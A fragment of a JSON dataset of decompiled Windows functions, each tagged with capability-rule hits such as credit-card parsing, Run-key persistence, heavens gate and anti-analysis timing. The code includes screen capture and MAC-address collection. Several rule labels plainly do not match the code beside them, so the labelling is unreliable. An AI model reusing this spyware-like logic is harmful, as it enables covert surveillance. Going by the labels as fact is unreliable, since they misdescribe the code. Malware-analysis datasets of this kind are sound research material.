        "decompiled_code": "\nuint32_t * fcn.00422b30(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar8 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar8[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar8[2]) break;\n            pcVar1 = pcVar8 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar8 = pcVar8 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 923
    },
    "004053d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint fcn.004053d0(void)\n\n{\n    code *pcVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    var_4h = 4;\n    arg_8h = fcn.00422819(0x288);\n    pcVar1 = _sym.imp.IPHLPAPI.DLL_GetAdaptersInfo;\n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.IPHLPAPI.DLL_GetAdaptersInfo)(arg_8h, &var_4h);\n    if ((iVar2 == 0x6f) && (arg_8h = fcn.00422819(var_4h),  arg_8h == 0)) {\n        return 0;\n    }\n    iVar2 = (*pcVar1)(arg_8h, &var_4h);\n    if (iVar2 == 0) {\n        if (arg_8h != 0) {\n            arg_8h_00 = fcn.0041ff97(0x10);\n            fcn.00420bd5(arg_8h_00, \"%02X%02X%02X%02X%02X%02X\", *(arg_8h + 0x194));\n            fcn.004214f1(arg_8h);\n            return arg_8h_00;\n        }\n    }\n    else if (arg_8h != 0) {\n        fcn.004214f1(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 360
    },
    "0040a440": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a440(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t arg_8h_00;\n    uint uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint hWnd;\n    uint var_25ch;\n    uint hDC;\n    uint var_254h;\n    uint hdcDest;\n    int32_t var_24ch;\n    int32_t var_248h;\n    uint *var_244h;\n    code **var_240h;\n    uint var_230h;\n    int32_t var_22ch;\n    int32_t var_228h;\n    int32_t var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t lpRect;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    var_248h = arg_8h;\n    uVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar1, &lpRect);\n    var_ch = var_ch - var_14h;\n    var_10h = var_10h - lpRect;\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(uVar1);\n    uVar7 = uVar2;\n    uVar3 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)();\n    iVar4 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(uVar2, var_10h, var_ch);\n    if (iVar4 == 0) {\n        fcn.00420bc6(uVar7);\n        return;\n    }\n    (*_sym.imp.GDI32.dll_SelectObject)(uVar3, iVar4);\n    uVar7 = uVar3;\n    iVar4 = var_10h;\n    (*_sym.imp.GDI32.dll_BitBlt)(uVar3, 0, 0, var_10h, var_ch, uVar2, lpRect, var_14h, 0xcc0020);\n    var_3ch = 0;\n    var_38h = 0;\n    var_90h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_244h = &var_a4h;\n    var_a4h = 0x40e880;\n    var_a0h = 0x40e920;\n    var_9ch = 0x40e8c0;\n    var_98h = 0x40e960;\n    var_94h = 0x40ea10;\n    var_34h = 0x43d190;\n    var_30h = 0x7e;\n    fcn.0040e3d0();\n    arg_8h_00 = fcn.00421d73(var_248h, 0x43c304);\n    if (arg_8h_00 == 0) {\n        fcn.00420bc6(iVar4);\n        return;\n    }\n    if (var_22ch == 0) {\n        var_22ch = (**var_240h)(&var_244h, 0, 0x1c);\n    }\n    *(var_22ch + 8) = 0x40e790;\n    *(var_22ch + 0xc) = 0x40e7c0;\n    *(var_22ch + 0x10) = 0x40e810;\n    *(var_22ch + 0x14) = arg_8h_00;\n    var_220h = 3;\n    var_21ch = 2;\n    var_228h = var_10h;\n    var_224h = var_ch;\n    fcn.0040dc70();\n    fcn.0040db30(0);\n    fcn.0040e650();\n    var_24ch = fcn.0041ff97(var_10h * 3);\n    var_248h = 0;\n    if (0 < var_ch) {\n        do {\n            iVar4 = 0;\n            if (0 < var_10h) {\n                iVar6 = 0;\n                do {\n                    uVar5 = (*_sym.imp.GDI32.dll_GetPixel)(uVar3, iVar4, var_248h);\n                    *(iVar6 + var_24ch) = uVar5;\n                    *(iVar6 + 1 + var_24ch) = uVar5 >> 8;\n                    *(iVar6 + 2 + var_24ch) = uVar5 >> 0x10;\n                    iVar4 = iVar4 + 1;\n                    iVar6 = iVar6 + 3;\n                } while (iVar4 < var_10h);\n            }\n            fcn.0040e6c0(&var_24ch);\n            var_248h = var_248h + 1;\n        } while (var_248h < var_ch);\n    }\n    fcn.0040e500();\n    if (var_240h != NULL) {\n        (*var_240h[10])(&var_244h);\n    }\n    var_240h = NULL;\n    var_230h = 0;\n    fcn.004220e7(var_24ch);\n    fcn.004226f5(arg_8h_00);\n    (*_sym.imp.GDI32.dll_DeleteDC)(uVar3);\n    (*_sym.imp.USER32.dll_ReleaseDC)(uVar1, uVar2);\n    fcn.00420bc6(uVar7);\n    return;\n}\n",
        "token_count": 1376
    },
    "00412bd0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint32_t fcn.00412bd0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *unaff_ESI;\n    \n    if (((unaff_ESI[7] & 0xff000000U) != 0) || ((unaff_ESI[8] & 0xff000000U) != 0)) {\n        *(*unaff_ESI + 0x14) = 0x2a;\n        *(*unaff_ESI + 0x18) = 0xffdc;\n        (***unaff_ESI)();\n    }\n    iVar2 = unaff_ESI[0x5a];\n    uVar1 = unaff_ESI[0xe];\n    uVar4 = unaff_ESI[0xf] * iVar2;\n    if (uVar4 <= uVar1) {\n        unaff_ESI[0x10] = unaff_ESI[7] * iVar2;\n        unaff_ESI[0x11] = unaff_ESI[8] * iVar2;\n        unaff_ESI[0x41] = 1;\n        unaff_ESI[0x42] = 1;\n        return unaff_ESI[8] * iVar2;\n    }\n    if (uVar4 <= uVar1 * 2) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 1) / 2;\n        iVar2 = (unaff_ESI[8] * iVar2 + 1) / 2;\n        unaff_ESI[0x11] = iVar2;\n        unaff_ESI[0x41] = 2;\n        unaff_ESI[0x42] = 2;\n        return iVar2;\n    }\n    if (uVar4 <= uVar1 * 3) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 2) / 3;\n        iVar2 = unaff_ESI[8] * iVar2 + 2;\n        unaff_ESI[0x11] = iVar2 / 3;\n        unaff_ESI[0x41] = 3;\n        unaff_ESI[0x42] = 3;\n        return iVar2 * 0x55555556;\n    }\n    if (uVar4 <= uVar1 * 4) {\n        iVar3 = unaff_ESI[7] * iVar2 + 3;\n        unaff_ESI[0x10] = iVar3 + (iVar3 >> 0x1f & 3U) >> 2;\n        iVar2 = unaff_ESI[8] * iVar2 + 3;\n        iVar2 = iVar2 + (iVar2 >> 0x1f & 3U) >> 2;\n        unaff_ESI[0x11] = iVar2;\n        unaff_ESI[0x41] = 4;\n        unaff_ESI[0x42] = 4;\n        return iVar2;\n    }\n    if (uVar4 <= uVar1 * 5) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 4) / 5;\n        iVar2 = unaff_ESI[8] * iVar2 + 4;\n        unaff_ESI[0x11] = iVar2 / 5;\n        unaff_ESI[0x41] = 5;\n        unaff_ESI[0x42] = 5;\n        return iVar2 * 0x66666667;\n    }\n    if (uVar4 <= uVar1 * 6) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 5) / 6;\n        iVar2 = unaff_ESI[8] * iVar2 + 5;\n        unaff_ESI[0x11] = iVar2 / 6;\n        unaff_ESI[0x41] = 6;\n        unaff_ESI[0x42] = 6;\n        return iVar2 * 0x2aaaaaab;\n    }\n    if (uVar4 <= uVar1 * 7) {\n        iVar3 = unaff_ESI[8] * iVar2 + 6;\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 6) / 7;\n        unaff_ESI[0x11] = iVar3 / 7;\n        unaff_ESI[0x41] = 7;\n        unaff_ESI[0x42] = 7;\n        return iVar3 * -0x6db6db6d;\n    }\n    if (uVar4 <= uVar1 * 8) {\n        iVar3 = unaff_ESI[7] * iVar2 + 7;\n        unaff_ESI[0x10] = iVar3 + (iVar3 >> 0x1f & 7U) >> 3;\n        iVar2 = unaff_ESI[8] * iVar2 + 7;\n        iVar2 = iVar2 + (iVar2 >> 0x1f & 7U) >> 3;\n        unaff_ESI[0x11] = iVar2;\n        unaff_ESI[0x41] = 8;\n        unaff_ESI[0x42] = 8;\n        return iVar2;\n    }\n    if (uVar4 <= uVar1 * 9) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 8) / 9;\n        iVar2 = unaff_ESI[8] * iVar2 + 8;\n        unaff_ESI[0x11] = iVar2 / 9;\n        unaff_ESI[0x41] = 9;\n        unaff_ESI[0x42] = 9;\n        return iVar2 * 0x38e38e39;\n    }\n    if (uVar4 <= uVar1 * 10) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 9) / 10;\n        iVar2 = unaff_ESI[8] * iVar2 + 9;\n        unaff_ESI[0x11] = iVar2 / 10;\n        unaff_ESI[0x41] = 10;\n        unaff_ESI[0x42] = 10;\n        return iVar2 * 0x66666667;\n    }\n    if (uVar4 <= uVar1 * 0xb) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 10) / 0xb;\n        iVar2 = unaff_ESI[8] * iVar2 + 10;\n        unaff_ESI[0x11] = iVar2 / 0xb;\n        unaff_ESI[0x41] = 0xb;\n        unaff_ESI[0x42] = 0xb;\n        return iVar2 * 0x2e8ba2e9;\n    }\n    if (uVar4 <= uVar1 * 0xc) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 0xb) / 0xc;\n        iVar2 = unaff_ESI[8] * iVar2 + 0xb;\n        unaff_ESI[0x11] = iVar2 / 0xc;\n        unaff_ESI[0x41] = 0xc;\n        unaff_ESI[0x42] = 0xc;\n        return iVar2 * 0x2aaaaaab;\n    }\n    if (uVar4 <= uVar1 * 0xd) {\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 0xc) / 0xd;\n        iVar2 = unaff_ESI[8] * iVar2 + 0xc;\n        unaff_ESI[0x11] = iVar2 / 0xd;\n        unaff_ESI[0x41] = 0xd;\n        unaff_ESI[0x42] = 0xd;\n        return iVar2 * 0x4ec4ec4f;\n    }\n    if (uVar4 <= uVar1 * 0xe) {\n        iVar3 = unaff_ESI[8] * iVar2 + 0xd;\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 0xd) / 0xe;\n        unaff_ESI[0x11] = iVar3 / 0xe;\n        unaff_ESI[0x41] = 0xe;\n        unaff_ESI[0x42] = 0xe;\n        return iVar3 * -0x6db6db6d;\n    }\n    if (uVar4 <= uVar1 * 0xf) {\n        iVar3 = unaff_ESI[8] * iVar2 + 0xe;\n        unaff_ESI[0x10] = (unaff_ESI[7] * iVar2 + 0xe) / 0xf;\n        unaff_ESI[0x11] = iVar3 / 0xf;\n        unaff_ESI[0x41] = 0xf;\n        unaff_ESI[0x42] = 0xf;\n        return iVar3 * -0x77777777;\n    }\n    iVar3 = unaff_ESI[7] * iVar2 + 0xf;\n    unaff_ESI[0x10] = iVar3 + (iVar3 >> 0x1f & 0xfU) >> 4;\n    iVar2 = unaff_ESI[8] * iVar2 + 0xf;\n    unaff_ESI[0x11] = iVar2 + (iVar2 >> 0x1f & 0xfU) >> 4;\n    unaff_ESI[0x41] = 0x10;\n    unaff_ESI[0x42] = 0x10;\n    return 0x10;\n}\n",
        "token_count": 2254
    },
    "0040cfe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040cfe0(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    uVar1 = 0x10;\n    piVar3 = 0x43c22c;\n    do {\n        if (*param_2 != *piVar3) {\n            iVar2 = *param_2 - *piVar3;\n            if (((iVar2 == 0) && (iVar2 = *(param_2 + 1) - *(piVar3 + 1),  iVar2 == 0)) &&\n               (iVar2 = *(param_2 + 2) - *(piVar3 + 2),  iVar2 == 0)) {\n                iVar2 = *(param_2 + 3) - *(piVar3 + 3);\n            }\n            return (iVar2 >> 0x1f | 1U) == 0;\n        }\n        uVar1 = uVar1 - 4;\n        piVar3 = piVar3 + 1;\n        param_2 = param_2 + 1;\n    } while (3 < uVar1);\n    return true;\n}\n",
        "token_count": 269
    },
    "00410cf0": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410dda)\n\nvoid fcn.00410cf0(void)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    int32_t *unaff_EBX;\n    code *pcStack4;\n    \n    unaff_EBX[1] = 0;\n    pcStack4 = NULL;\n    ppcVar1 = fcn.00422819(0x54);\n    if (ppcVar1 == NULL) {\n        *(*unaff_EBX + 0x14) = 0x38;\n        *(*unaff_EBX + 0x18) = 0;\n        (***unaff_EBX)();\n    }\n    *ppcVar1 = fcn.00410140;\n    ppcVar1[1] = fcn.00410290;\n    ppcVar1[2] = fcn.00410350;\n    ppcVar1[3] = fcn.00410400;\n    ppcVar1[4] = 0x4104b0;\n    ppcVar1[5] = 0x410520;\n    ppcVar1[6] = 0x410590;\n    ppcVar1[7] = 0x410850;\n    ppcVar1[8] = 0x410990;\n    ppcVar1[9] = 0x410ae0;\n    ppcVar1[10] = 0x410bd0;\n    ppcVar1[0xc] = 0x3b9aca00;\n    ppcVar1[0xb] = pcStack4;\n    ppcVar1[0xe] = NULL;\n    ppcVar1[0x10] = NULL;\n    ppcVar1[0xd] = NULL;\n    ppcVar1[0xf] = NULL;\n    ppcVar1[0x11] = NULL;\n    ppcVar1[0x12] = NULL;\n    ppcVar1[0x13] = 0x54;\n    unaff_EBX[1] = ppcVar1;\n    iVar2 = fcn.00420d1e(\"JPEGMEM\");\n    if ((iVar2 != 0) && (iVar2 = fcn.00422b02(iVar2, \"%ld%c\", &pcStack4),  0 < iVar2)) {\n        ppcVar1[0xb] = pcStack4 * 1000;\n    }\n    return;\n}\n",
        "token_count": 543
    },
    "00433436": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00433436(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_EDI) {\n        if (*(unaff_EBP + -0x20) != unaff_EDI) {\n            puVar1 = *((*unaff_ESI >> 5) * 4 + 0x444b80) + 4 + (*unaff_ESI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0043293a(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_10h;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char **ppcVar9;\n    \n    // [00] -r-x section size 229376 named .text\n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    puVar8 = 0x444b18;\n    do {\n        ppcVar9 = 0x444afc;\n        do {\n            pcVar3 = fcn.00420d1e(*puVar8);\n            pcVar7 = pcVar3 + 1;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            pcVar4 = *ppcVar9;\n            pcVar6 = pcVar4 + 1;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            uVar2 = fcn.0041ff97(pcVar3 + pcVar4 + ((8 - pcVar6) - pcVar7));\n            arg_10h = fcn.00420d1e(*puVar8);\n            fcn.00420bd5(uVar2, 0x43c26c, arg_10h);\n            iVar5 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar5 != 0) {\n                return uVar2;\n            }\n            fcn.00420c59(uVar2);\n            ppcVar9 = ppcVar9 + 1;\n        } while (ppcVar9 < 0x444b18);\n        puVar8 = puVar8 + 1;\n        if (0x444b1b < puVar8) {\n            fcn.00420c76();\n            pcVar6 = fcn.00420d1e(*0x444b18);\n            iVar5 = fcn.00420c76();\n            pcVar7 = *((iVar5 % 7) * 4 + 0x444afc);\n            pcVar3 = pcVar6;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            pcVar4 = pcVar7 + 1;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            uVar2 = fcn.0041ff97(pcVar3 + pcVar7 + ((8 - pcVar4) - (pcVar6 + 1)));\n            fcn.00420bd5(uVar2, 0x43c26c, pcVar6);\n            return uVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 697
    },
    "00401120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists"
        ],
        "decompiled_code": "\nuint fcn.00401120(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    char **var_4h;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    var_4h = 0x444b1c;\n    do {\n        uVar2 = fcn.00420e6f(0);\n        fcn.00420c64(uVar2);\n        puVar9 = 0x444b18;\n        do {\n            ppcVar10 = 0x444afc;\n            do {\n                pcVar3 = fcn.00420d1e(*puVar9);\n                pcVar5 = pcVar3 + 1;\n                do {\n                    cVar1 = *pcVar3;\n                    pcVar3 = pcVar3 + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = *ppcVar10;\n                pcVar7 = pcVar4 + 1;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                pcVar5 = fcn.0041ff97(pcVar3 + pcVar4 + ((8 - pcVar7) - pcVar5));\n                uVar2 = fcn.00420d1e(*puVar9);\n                fcn.00420bd5(pcVar5, 0x43c26c, uVar2);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pcVar5);\n                if (iVar6 != 0) goto code_r0x0040124b;\n                fcn.00420c59(pcVar5);\n                ppcVar10 = ppcVar10 + 1;\n            } while (ppcVar10 < 0x444b18);\n            puVar9 = puVar9 + 1;\n        } while (puVar9 < 0x444b1c);\n        fcn.00420c76();\n        pcVar7 = fcn.00420d1e(*0x444b18);\n        iVar6 = fcn.00420c76();\n        pcVar5 = *((iVar6 % 7) * 4 + 0x444afc);\n        pcVar3 = pcVar7;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        pcVar4 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5 = fcn.0041ff97(pcVar3 + pcVar5 + ((8 - pcVar4) - (pcVar7 + 1)));\n        fcn.00420bd5(pcVar5, 0x43c26c, pcVar7);\ncode_r0x0040124b:\n        pcVar3 = pcVar5;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        pcVar4 = *var_4h;\n        pcVar7 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + pcVar4 + ((8 - pcVar7) - (pcVar5 + 1)));\n        fcn.00420bd5(uVar2, 0x43c26c, pcVar5);\n        fcn.00420c59(pcVar5);\n        iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n        if (iVar6 != 0) {\n            return uVar2;\n        }\n        fcn.00420c59(uVar2);\n        var_4h = var_4h + 1;\n        if (0x444b3b < var_4h) {\n            pcVar5 = fcn.00401000();\n            uVar8 = fcn.00420c76();\n            uVar8 = uVar8 & 0x80000007;\n            if (uVar8 < 0) {\n                uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n            }\n            pcVar3 = *(uVar8 * 4 + 0x444b1c);\n            pcVar7 = pcVar5;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            pcVar4 = pcVar3 + 1;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            uVar2 = fcn.0041ff97(pcVar7 + pcVar3 + ((8 - pcVar4) - (pcVar5 + 1)));\n            fcn.00420bd5(uVar2, 0x43c26c, pcVar5);\n            fcn.00420c59(pcVar5);\n            return uVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 1264
    },
    "00401330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists"
        ],
        "decompiled_code": "\nuint fcn.00401330(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint *puVar8;\n    char **ppcVar9;\n    char **var_4h;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    var_4h = 0x444ae0;\n    do {\n        uVar2 = fcn.00420e6f(0);\n        fcn.00420c64(uVar2);\n        puVar8 = 0x444b18;\n        do {\n            ppcVar9 = 0x444afc;\n            do {\n                pcVar3 = fcn.00420d1e(*puVar8);\n                pcVar5 = pcVar3 + 1;\n                do {\n                    cVar1 = *pcVar3;\n                    pcVar3 = pcVar3 + 1;\n                } while (cVar1 != '\\0');\n                pcVar4 = *ppcVar9;\n                pcVar7 = pcVar4 + 1;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                pcVar5 = fcn.0041ff97(pcVar3 + pcVar4 + ((8 - pcVar7) - pcVar5));\n                uVar2 = fcn.00420d1e(*puVar8);\n                fcn.00420bd5(pcVar5, 0x43c26c, uVar2);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(pcVar5);\n                if (iVar6 != 0) goto code_r0x0040145b;\n                fcn.00420c59(pcVar5);\n                ppcVar9 = ppcVar9 + 1;\n            } while (ppcVar9 < 0x444b18);\n            puVar8 = puVar8 + 1;\n        } while (puVar8 < 0x444b1c);\n        fcn.00420c76();\n        pcVar7 = fcn.00420d1e(*0x444b18);\n        iVar6 = fcn.00420c76();\n        pcVar5 = *((iVar6 % 7) * 4 + 0x444afc);\n        pcVar3 = pcVar7;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        pcVar4 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5 = fcn.0041ff97(pcVar3 + pcVar5 + ((8 - pcVar4) - (pcVar7 + 1)));\n        fcn.00420bd5(pcVar5, 0x43c26c, pcVar7);\ncode_r0x0040145b:\n        pcVar3 = pcVar5;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        pcVar4 = *var_4h;\n        pcVar7 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + pcVar4 + ((8 - pcVar7) - (pcVar5 + 1)));\n        fcn.00420bd5(uVar2, 0x43c26c, pcVar5);\n        iVar6 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n        if (iVar6 != 0) {\n            return uVar2;\n        }\n        fcn.00420c59(pcVar5);\n        fcn.00420c59(uVar2);\n        var_4h = var_4h + 1;\n        if (0x444afb < var_4h) {\n            pcVar7 = fcn.00401000();\n            iVar6 = fcn.00420c76();\n            pcVar5 = *((iVar6 % 7) * 4 + 0x444ae0);\n            pcVar3 = pcVar7;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            pcVar4 = pcVar5 + 1;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar2 = fcn.0041ff97(pcVar3 + pcVar5 + ((8 - pcVar4) - (pcVar7 + 1)));\n            fcn.00420bd5(uVar2, 0x43c26c, pcVar7);\n            fcn.00420c59(pcVar7);\n            return uVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 1202
    },
    "00401540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value",
            "persist via Run registry key"
        ],
